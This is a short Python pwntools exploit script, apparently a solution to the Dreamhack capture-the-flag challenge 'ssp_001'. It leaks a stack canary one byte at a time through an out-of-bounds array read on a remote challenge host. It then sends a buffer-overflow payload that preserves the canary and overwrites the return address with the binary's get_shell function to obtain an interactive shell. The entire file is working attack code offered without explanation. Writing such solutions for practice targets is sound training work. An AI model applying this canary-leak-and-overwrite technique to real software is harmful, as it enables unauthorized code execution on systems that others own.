#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./ssp_001',checksec=False)

# r = process(exe.path)
r = remote('host3.dreamhack.games',21752)

canary ='0x'
r.sendafter(b'> ',b'P')
r.sendlineafter(b"Element index : ",b'131')
r.recvuntil(b'Element of index 131 is : ')
canary += str(r.recv(2).decode())

r.sendafter(b'> ',b'P')
r.sendlineafter(b"Element index : ",b'130')
r.recvuntil(b'Element of index 130 is : ')
canary += str(r.recv(2).decode())

r.sendafter(b'> ',b'P')
r.sendlineafter(b"Element index : ",b'129')
r.recvuntil(b'Element of index 129 is : ')
canary += str(r.recv(2).decode())
canary += '00'
log.info(canary)

payload = b'A'*0x40 + p32(int(canary,16))
payload += b'A'*8 + p32(exe.sym['get_shell'])
r.sendafter(b'> ',b'E')
r.sendlineafter(b'Name Size : ',b'1000')
r.sendafter(b'Name : ',payload)

r.interactive()